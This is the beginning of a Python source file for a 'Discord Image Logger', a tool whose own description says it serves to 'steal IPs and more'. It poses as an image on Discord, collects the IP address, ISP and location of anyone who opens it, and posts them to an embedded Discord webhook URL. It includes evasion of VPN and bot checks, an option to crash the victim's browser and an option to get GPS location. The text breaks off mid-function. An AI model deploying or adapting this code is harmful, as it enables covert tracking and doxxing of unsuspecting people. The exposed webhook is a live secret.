# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1403702024956018719/zFjYdJNEn0ewvxmbG9T7AOj9Z3tIRaonHbwv46G8zS0wbWVxMvUDUjW3WUl_zSrpbX7_",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
